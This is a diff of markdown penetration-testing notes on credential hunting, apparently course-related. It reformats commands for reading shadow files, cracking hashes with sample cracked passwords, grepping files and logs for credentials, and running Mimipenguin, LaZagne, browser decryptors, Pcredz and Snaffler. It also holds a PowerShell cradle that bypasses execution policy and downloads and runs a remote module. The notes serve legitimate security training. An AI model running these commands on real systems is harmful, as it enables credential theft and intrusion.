-```bash
-# john:$y$j9T$3QSBB6CbHEu...f8Ms:18955:0:99999:7:::
+<table width="100%">
+<tr>
+<td colspan="2"> 📄 <b>Text — /etc/shadow entry</b> </td>
+</tr>
+<tr>
+<td>
+
 ```
+john:$y$j9T$3QSBB6CbHEu...f8Ms:18955:0:99999:7:::
+```
+
+</td>
+</tr>
+</table>
 
 | Field             | Value                                      |
 |-------------------|--------------------------------------------|
@@ -3846,9 +5241,20 @@ The `/etc/shadow` file is only readable by users with administrative privileges,
 If the Password field contains a character such as ! or *, the user cannot log in using a Unix password. However, other authentication methods—such as Kerberos or key-based authentication—can still be used. The same applies if the Password field is empty, meaning no password is required for login.
 The Password field also follows a particular format, from which we can extract additional information:
 
-```bash
-# $<id>$<salt>$<hashed>
+<table width="100%">
+<tr>
+<td colspan="2"> 📄 <b>Text — Hash format</b> </td>
+</tr>
+<tr>
+<td>
+
 ```
+$<id>$<salt>$<hashed>
+```
+
+</td>
+</tr>
+</table>
 
 As we can see here, the hashed passwords are divided into three parts. The ID value specifies which cryptographic hash algorithm was used, typically one of the following:
 
@@ -3872,12 +5278,36 @@ Many Linux distributions, including Debian, now use yescrypt as the default hash
 
 The PAM library (pam_unix.so) can prevent users from reusing old passwords. These previous passwords are stored in the /etc/security/opasswd file. Administrator (root) privileges are required to read this file, assuming its permissions have not been modified manually.
 
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`target@victim:~$`**
+
+</td>
+<td>
+
 ```bash
 sudo cat /etc/security/opasswd
 ```
-```bash
-# cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
 ```
+cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
+```
+
+</td>
+</tr>
+</table>
 
 The presence of multiple cry0l1t3 entries with MD5 ($1$) hashes in the file reveals critical security concerns. 
 
@@ -3893,27 +5323,87 @@ This is particularly important when identifying old passwords and recognizing pa
 
 Once we have root access on a Linux system, we can extract user password hashes and attempt to crack them to recover plaintext passwords. A useful tool for this is **[unshadow](https://github.com/pmittaldev/john-the-ripper/blob/master/src/unshadow.c)**, included with John the Ripper (JtR). It combines the `/etc/passwd` and `/etc/shadow` files into a single file format suitable for cracking.
 
+1. **Create** the unshadowed file
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
-sudo cp /etc/passwd /tmp/passwd.bak 
-sudo cp /etc/shadow /tmp/shadow.bak 
+sudo cp /etc/passwd /tmp/passwd.bak
+sudo cp /etc/shadow /tmp/shadow.bak
 sudo unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
 ```
 
-This "unshadowed" file can now be attacked with either JtR or hashcat
+</td>
+</tr>
+</table>
+
+2. **Crack** with Hashcat
+
+This "unshadowed" file can now be attacked with either JtR or hashcat:
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 hashcat -m 1800 -a 0 /tmp/unshadowed.hashes /usr/share/wordlists/rockyou.txt -o /tmp/unshadowed.cracked
 ```
 
-Display the results
+</td>
+</tr>
+</table>
+
+3. **Display** the results
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 cat /tmp/unshadowed.cracked
 ```
-```bash
-# $6$EBOM5vJAV1TPvrdP$LqsLyYkoGzAGt4ihyvfhvBrrGpVjV976B3dEubi9i95P5cDx1U6BrE9G020PWuaeI6JSNaIDIbn43uskRDG0U/:mariposa
-# $6$0XiU8Oe/pGpxWvdq$n6TgiYUVAXBUOO11C155Ea8nNpSVtFFVQveY6yExlOdPu99hY4V9Chi1KEy/lAluVFuVcvi8QCO1mCG6ra70A1:Martin1
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
 ```
+$6$EBOM5vJAV1TPvrdP$LqsLyYkoGzAGt4ihyvfhvBrrGpVjV976B3dEubi9i95P5cDx1U6BrE9G020PWuaeI6JSNaIDIbn43uskRDG0U/:mariposa
+$6$0XiU8Oe/pGpxWvdq$n6TgiYUVAXBUOO11C155Ea8nNpSVtFFVQveY6yExlOdPu99hY4V9Chi1KEy/lAluVFuVcvi8QCO1mCG6ra70A1:Martin1
+```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -3953,69 +5443,213 @@ A core principle of Linux is that everything is a file, so it's essential to app
 
 Configuration files (`.config`, `.conf`, `.cnf`) are the core of the functionality of services on Linux distributions.
 
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`target@victim:~$`**
+
+</td>
+<td>
+
 ```bash
 for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
 ```
 
-**Searching configuration files for three words (user, password, pass) in each file with the file extension `.cnf`**
+</td>
+</tr>
+</table>
 
-Often they even contain credentials that we will be able to read.
+**Searching configuration files for credentials**
+
+Often they even contain credentials that we will be able to read:
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`target@victim:~$`**
+
+</td>
+<td>
 
 ```bash
 for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
 ```
 
+</td>
+</tr>
+</table>
+
 **Searching for databases**
 
-We can apply this simple search to the other file extensions as well.
+We can apply this simple search to the other file extensions as well:
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`target@victim:~$`**
+
+</td>
+<td>
 
 ```bash
 for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
 ```
 
+</td>
+</tr>
+</table>
+
 **Searching for notes**
 
-These often include lists of many different access points or even their credentials.
+These often include lists of many different access points or even their credentials:
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`target@victim:~$`**
+
+</td>
+<td>
 
 ```bash
 find /home/* -type f -name "*.txt" -o ! -name "*.*"
 ```
 
+</td>
+</tr>
+</table>
+
 **Searching for scripts**
 
-Scripts are files that often contain highly sensitive information and processes.
+Scripts are files that often contain highly sensitive information and processes:
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`target@victim:~$`**
+
+</td>
+<td>
 
 ```bash
 for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
 ```
 
+</td>
+</tr>
+</table>
+
 **Enumerating cronjobs**
 
-Some applications and scripts require credentials to run and are therefore incorrectly entered in the cronjobs.
+Some applications and scripts require credentials to run and are therefore incorrectly entered in the cronjobs:
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`target@victim:~$`**
+
+</td>
+<td>
 
 ```bash
 cat /etc/crontab
 ```
 
+</td>
+</tr>
+</table>
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`target@victim:~$`**
+
+</td>
+<td>
+
 ```bash
 ls -la /etc/cron.*/
 ```
 
-**Enumerating cronjobs**
+</td>
+</tr>
+</table>
 
-We are interested in the files that store users' command history and the logs that store information about system processes.
+**Enumerating bash history**
+
+We are interested in the files that store users' command history and the logs that store information about system processes:
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`target@victim:~$`**
+
+</td>
+<td>
 
 ```bash
 tail -n5 /home/*/.bash*
 ```
 
+</td>
+</tr>
+</table>
+
 **Enumerating log files**
 
 Here are some strings we can use to find interesting content in the logs:
 
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`target@victim:~$`**
+
+</td>
+<td>
+
 ```bash
 for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
 ```
+
+</td>
+</tr>
+</table>
 
 An essential concept of Linux systems is log files that are stored in text files. The entirety of log files can be divided into four categories:
 
@@ -4055,34 +5689,93 @@ Many different logs exist on the system:
 * **Web browsers** (Chrome, Firefox stored passwords)
 * **System services** (SSH keys, sudo tokens)
 
-**Install**
+1. **Install** Mimipenguin
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`target@victim:~$`**
+
+</td>
+<td>
 
 ```bash
 git clone https://github.com/huntergregal/mimipenguin
 cd mimipenguin/
-sudo ./mimipenguin.sh 
 ```
 
-**Usage: Python**
+</td>
+</tr>
+</table>
+
+2. **Run** Mimipenguin (Python)
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`target@victim:~$`**
+
+</td>
+<td>
 
 ```bash
 sudo ./mimipenguin.py
 ```
 
-**Usage: Bash**
+</td>
+</tr>
+</table>
+
+3. **Run** Mimipenguin (Bash)
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`target@victim:~$`**
+
+</td>
+<td>
 
 ```bash
-sudo ./mimipenguin.sh 
+sudo ./mimipenguin.sh
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
 <details>
 <summary><h4>LaZagne</h4></summary>
 
-An even more powerful tool we can use that was mentioned earlier in the Credential Hunting in Windows section is LaZagne. This tool allows us to access far more resources and extract the credentials. 
+An even more powerful tool we can use that was mentioned earlier in the Credential Hunting in Windows section is LaZagne. This tool allows us to access far more resources and extract the credentials.
 
-**Install**
+1. **Install** LaZagne
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`target@victim:~$`**
+
+</td>
+<td>
 
 ```bash
 git clone https://github.com/AlessandroZ/LaZagne
@@ -4092,11 +5785,31 @@ python -m pip install -r requirements.txt
 cd Linux/
 ```
 
-**Usage**
+</td>
+</tr>
+</table>
+
+2. **Run** LaZagne
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`target@victim:~$`**
+
+</td>
+<td>
 
 ```bash
 sudo python3 laZagne.py all
 ```
+
+</td>
+</tr>
+</table>
 
 The passwords and hashes we can obtain come from the following sources but are not limited to:
 
@@ -4143,13 +5856,45 @@ The passwords and hashes we can obtain come from the following sources but are n
 <details>
 <summary><h3>Stored credentials</h3></summary>
 
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`target@victim:~$`**
+
+</td>
+<td>
+
 ```bash
 ls -l .mozilla/firefox/ | grep default
 ```
 
+</td>
+</tr>
+</table>
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`target@victim:~$`**
+
+</td>
+<td>
+
 ```bash
 cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -4158,14 +5903,42 @@ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
 
 [Firefox Decrypt](https://github.com/unode/firefox_decrypt) is a tool to extract passwords from profiles of Mozilla (Fire/Water)fox™, Thunderbird®, SeaMonkey® and derivates. The script is [`here`](../scripts/passwords/firefox_decrypt.py).
 
-**Download the tool**
+1. **Download** the tool
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 git clone https://github.com/unode/firefox_decrypt
 cd firefox_decrypt/
 ```
 
-**Install python 3.9+**
+</td>
+</tr>
+</table>
+
+2. **Install** Python 3.9+ (if needed)
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 wget https://www.python.org/ftp/python/3.9.18/Python-3.9.18.tar.xz
@@ -4179,17 +5952,53 @@ rm -rf Python-3.9.18
 rm Python-3.9.18.tar.xz
 ```
 
-**Usage**
+</td>
+</tr>
+</table>
+
+3. **Run** firefox_decrypt
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 python3.9 ./firefox_decrypt.py
 ```
 
-**Advanced usage**
+</td>
+</tr>
+</table>
+
+**Advanced usage** (specify profile path):
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 python3.9 firefox_decrypt.py /folder/containing/profiles.ini/
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -4210,20 +6019,52 @@ This code has only been tested on windows, so it may not work on other OS.
 
 2. Install [Python](https://www.python.org/downloads/) for Windows
 
-**Install**
+3. **Install** the tool
 
-```bash
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
+
+```cmd
 git clone https://github.com/ohyicong/decrypt-chrome-passwords.git
 cd decrypt-chrome-passwords
 python -m pip install --upgrade pip
 python -m pip install -r requirements.txt
 ```
 
-**Usage**
+</td>
+</tr>
+</table>
 
-```bash
-python3 python decrypt_chrome_password.py
+4. **Run** the tool
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
+
+```cmd
+python decrypt_chrome_password.py
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -4262,224 +6103,127 @@ Wireshark is a well-known packet analyzer that comes pre-installed on nearly all
 
 **Install**
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 sudo apt update
 sudo apt install wireshark -y
 wireshark --version
 ```
 
+</td>
+</tr>
+</table>
+
 **Usage**
 
 <details>
 <summary><h4>1. Basic Commands</h4></summary>
 
-Read PCAP file
-
-```bash
-tshark -r file.pcap
-```
-
-Live capture on eth0 interface
-
-```bash
-tshark -i eth0
-```
-
-Show only first 100 packets
-
-```bash
-tshark -r file.pcap -c 100
-```
-
-Quiet mode (statistics only)
-
-```bash
-tshark -r file.pcap -q
-```
+| Command | Description |
+|---------|-------------|
+| `tshark -r file.pcap` | Read PCAP file |
+| `tshark -i eth0` | Live capture on eth0 interface |
+| `tshark -r file.pcap -c 100` | Show only first 100 packets |
+| `tshark -r file.pcap -q` | Quiet mode (statistics only) |
 
 </details>
 
 <details>
 <summary><h4>2. Advanced Filtering</h4></summary>
 
-Filter HTTP traffic
-
-```bash
-tshark -r file.pcap -Y "http"
-```
-
-Filter by source IP
-
-```bash
-tshark -r file.pcap -Y "ip.src == 192.168.1.1"
-```
-
-Search specific DNS queries
-
-```bash
-tshark -r file.pcap -Y "dns.qry.name contains 'google'"
-```
-
-Filter by TCP port
-
-```bash
-tshark -r file.pcap -Y "tcp.port == 445"
-```
+| Command | Description |
+|---------|-------------|
+| `tshark -r file.pcap -Y "http"` | Filter HTTP traffic |
+| `tshark -r file.pcap -Y "ip.src == 192.168.1.1"` | Filter by source IP |
+| `tshark -r file.pcap -Y "dns.qry.name contains 'google'"` | Search specific DNS queries |
+| `tshark -r file.pcap -Y "tcp.port == 445"` | Filter by TCP port |
 
 </details>
 
 <details>
 <summary><h4>3. Credential Extraction</h4></summary>
 
-Extract HTTP POST form data
-
-```bash
-tshark -r file.pcap -Y "http.request.method == POST" -T json
-```
-
-Capture FTP credentials
-
-```bash
-tshark -r file.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS"
-```
-
-Analyze SMB traffic
-
-```bash
-tshark -r file.pcap -Y "smb || nbns || dcerpc"
-```
+| Command | Description |
+|---------|-------------|
+| `tshark -r file.pcap -Y "http.request.method == POST" -T json` | Extract HTTP POST form data |
+| `tshark -r file.pcap -Y "ftp.request.command == USER \|\| ftp.request.command == PASS"` | Capture FTP credentials |
+| `tshark -r file.pcap -Y "smb \|\| nbns \|\| dcerpc"` | Analyze SMB traffic |
 
 </details>
 
 <details>
 <summary><h4>4. Protocol Analysis</h4></summary>
 
-Show TLS/SSL handshakes
-
-```bash
-tshark -r file.pcap -Y "tls.handshake"
-```
-
-Filter ICMP traffic (Ping)
-
-```bash
-tshark -r file.pcap -Y "icmp"
-```
-
-Analyze SSH connections
-
-```bash
-tshark -r file.pcap -Y "ssh.protocol"
-```
+| Command | Description |
+|---------|-------------|
+| `tshark -r file.pcap -Y "tls.handshake"` | Show TLS/SSL handshakes |
+| `tshark -r file.pcap -Y "icmp"` | Filter ICMP traffic (Ping) |
+| `tshark -r file.pcap -Y "ssh.protocol"` | Analyze SSH connections |
 
 </details>
 
 <details>
 <summary><h4>5. Data Export</h4></summary>
 
-Export HTTP traffic to new PCAP
-
-```bash
-tshark -r file.pcap -Y "http" -w http_traffic.pcap
-```
-
-Extract files transferred via HTTP
-
-```bash
-tshark -r file.pcap --export-objects "http,export_dir"
-```
-
-Export specific fields to text
-
-```bash
-tshark -r file.pcap -T fields -e http.host -e http.request.uri
-```
+| Command | Description |
+|---------|-------------|
+| `tshark -r file.pcap -Y "http" -w http_traffic.pcap` | Export HTTP traffic to new PCAP |
+| `tshark -r file.pcap --export-objects "http,export_dir"` | Extract files transferred via HTTP |
+| `tshark -r file.pcap -T fields -e http.host -e http.request.uri` | Export specific fields to text |
 
 </details>
 
 <details>
 <summary><h4>6. Statistics</h4></summary>
 
-Protocol hierarchy statistics
-
-```bash
-tshark -r file.pcap -qz io,phs
-```
-
-TCP conversations
-
-```bash
-tshark -r file.pcap -z conv,tcp
-```
-
-HTTP request summary
-
-```bash
-tshark -r file.pcap -z http_req,tree
-```
+| Command | Description |
+|---------|-------------|
+| `tshark -r file.pcap -qz io,phs` | Protocol hierarchy statistics |
+| `tshark -r file.pcap -z conv,tcp` | TCP conversations |
+| `tshark -r file.pcap -z http_req,tree` | HTTP request summary |
 
 </details>
 
 <details>
 <summary><h4>7. Pattern Searching</h4></summary>
 
-Find credit card numbers
-
-```bash
-tshark -r file.pcap -Y "frame matches '[0-9]{13,16}'"
-```
-
-Search for passwords in cleartext
-
-```bash
-tshark -r file.pcap -Y "frame contains 'password'"
-```
-
-Find suspicious domains
-
-```bash
-tshark -r file.pcap -Y "dns.qry.name ~ '(malware|exploit)'"
-```
+| Command | Description |
+|---------|-------------|
+| `tshark -r file.pcap -Y "frame matches '[0-9]{13,16}'"` | Find credit card numbers |
+| `tshark -r file.pcap -Y "frame contains 'password'"` | Search for passwords in cleartext |
+| `tshark -r file.pcap -Y "dns.qry.name ~ '(malware\|exploit)'"` | Find suspicious domains |
 
 </details>
 
 <details>
 <summary><h4>8. Advanced Decoding</h4></summary>
 
-Decrypt TLS with keylog file
-
-```bash
-tshark -r file.pcap -o "tls.keylog_file:sslkeylog.log"
-```
-
-Analyze SMB2 commands in detail
-
-```bash
-tshark -r file.pcap -Y "smb2.cmd == 5" -V
-```
+| Command | Description |
+|---------|-------------|
+| `tshark -r file.pcap -o "tls.keylog_file:sslkeylog.log"` | Decrypt TLS with keylog file |
+| `tshark -r file.pcap -Y "smb2.cmd == 5" -V` | Analyze SMB2 commands in detail |
 
 </details>
 
 <details>
 <summary><h4>9. Pro Tips</h4></summary>
 
-List all available fields
-
-```bash
-tshark -G fields | less
-```
-
-Real-time traffic analysis
-
-```bash
-tshark -i eth0 -Y "http" -l
-```
-
-Complex searches with grep
-
-```bash
-tshark -r file.pcap -V | grep -A 10 -B 10 "password"
-```
+| Command | Description |
+|---------|-------------|
+| `tshark -G fields \| less` | List all available fields |
+| `tshark -i eth0 -Y "http" -l` | Real-time traffic analysis |
+| `tshark -r file.pcap -V \| grep -A 10 -B 10 "password"` | Complex searches with grep |
 
 </details>
 
@@ -4517,7 +6261,19 @@ Pcredz is a tool that can be used to extract credentials from live traffic or ne
 * NTLMv1/v2 hashes from various traffic including DCE-RPC, SMBv1/2, LDAP, MSSQL, and HTTP
 * Kerberos (AS-REQ Pre-Auth etype 23) hashes
 
-**Install**
+1. **Install** Pcredz
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 sudo apt install -y python3-pip libpcap-dev file && sudo pip3 install Cython python-libpcap
@@ -4525,25 +6281,75 @@ git clone https://github.com/lgandx/PCredz.git
 cd PCredz
 ```
 
-**Usage**
+</td>
+</tr>
+</table>
 
-Extract credentials from a pcap file
+2. **Extract** credentials from a pcap file
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 python3 ./Pcredz -f file-to-parse.pcap
 ```
 
-Extract credentials from all pcap files in a folder
+</td>
+</tr>
+</table>
+
+3. **Extract** credentials from all pcap files in a folder
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 python3 ./Pcredz -d /tmp/pcap-directory-to-parse/
 ```
 
-Extract credentials from a live packet capture on a network interface (need root privileges)
+</td>
+</tr>
+</table>
+
+4. **Capture** live credentials (requires root)
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 python3 ./Pcredz -i eth0 -v
 ```
+
+</td>
+</tr>
+</table>
 
 | Option               | Description                                                                 | Example Usage                          |
 |----------------------|-----------------------------------------------------------------------------|----------------------------------------|
@@ -4584,20 +6390,67 @@ As a quick reminder, here are some general tips:
 
 **Usage**
 
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
+
 ```cmd
 snaffler.exe -s -o snaffler.log
 ```
+
+</td>
+</tr>
+</table>
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
+
 ```cmd
 snaffler.exe -s -i C:\ -o snaffler.log
 ```
 
+</td>
+</tr>
+</table>
+
 Once you find a useful share, you can mount it to explore its files:
 
-PowerShell:
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\>`**
+
+</td>
+<td>
 
 ```powershell
 net use Z: \\<IP>\<SHARE_NAME> /user:<DOMAIN>\<USER> <PASSWORD> /persistent:no
 ```
+
+</td>
+</tr>
+</table>
 
 | Option | Description | Example/Values |
 |--------|-------------|----------------|
@@ -4649,78 +6502,217 @@ The script can be found in the Github repo or [`here`](../scripts/passwords/Powe
 
 Below is a list of commands that can be used to load PowerHuntShares into your current PowerShell session. Please note that one of these will have to be run each time you run PowerShell is run. *It is not persistent.*
 
-*Option 1:* 
+**Option 1: Local module**
 
-1. Bypass execution policy restrictions
+1. **Bypass** execution policy restrictions
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\>`**
+
+</td>
+<td>
 
 ```powershell
 Set-ExecutionPolicy -Scope Process Bypass
 ```
 
-2. Import module that exists in the current directory
+</td>
+</tr>
+</table>
+
+2. **Import** module that exists in the current directory
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\>`**
+
+</td>
+<td>
 
 ```powershell
 Import-Module .\PowerHuntShares.psm1
 ```
 
-*Option 2:* 
+</td>
+</tr>
+</table>
 
-1. Reduce SSL operating level to support connection to github
+**Option 2: Remote download**
+
+1. **Configure** SSL and download module into memory
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\>`**
+
+</td>
+<td>
 
 ```powershell
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-[Net.ServicePointManager]::SecurityProtocol =[Net.SecurityProtocolType]::Tls12
-```
-
-2. Download and load PowerHuntShares.psm1 into memory
-
-```powershell
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/PowerHuntShares/main/PowerHuntShares.psm1")
 ```
+
+</td>
+</tr>
+</table>
 
 **Usage**
 
 > **NOTE:** All commands should be run as an unprivileged domain user.
 
-Example #1: Run from a domain computer. Performs Active Directory computer discovery by default.
+**Example #1:** Run from a domain computer (AD discovery by default)
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\>`**
+
+</td>
+<td>
 
 ```powershell
 Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
 ```
 
-Example #2: Run from a domain computer with alternative domain credentials. Performs Active Directory computer discovery by default.
+</td>
+</tr>
+</table>
+
+**Example #2:** Run with alternative domain credentials
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\>`**
+
+</td>
+<td>
 
 ```powershell
 $creds = Get-Credential <USER>
 Invoke-HuntSMBShares -Threads 100 -OutputDirectory C:\Users\Public -Credential $creds
 ```
 
-Example #3: Run from a domain computer as current user. Target hosts in a file. One per line.
+</td>
+</tr>
+</table>
+
+**Example #3:** Target hosts in a file (one per line)
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\>`**
+
+</td>
+<td>
 
 ```powershell
-Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public  -HostList c:\temp\hosts.txt
+Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public -HostList c:\temp\hosts.txt
 ```
 
-Example #4: Run from a non-domain computer with credential. Performs Active Directory computer discovery by default.
+</td>
+</tr>
+</table>
+
+**Example #4:** Run from a non-domain computer with credentials
 
 Get a PowerShell session:
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 runas /netonly /user:<DOMAIN>\<USER> PowerShell.exe
 ```
 
+</td>
+</tr>
+</table>
+
 Setup the script:
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\>`**
+
+</td>
+<td>
 
 ```powershell
 Set-ExecutionPolicy -Scope Process Bypass
 Import-Module .\PowerHuntShares.psm1
 ```
 
+</td>
+</tr>
+</table>
+
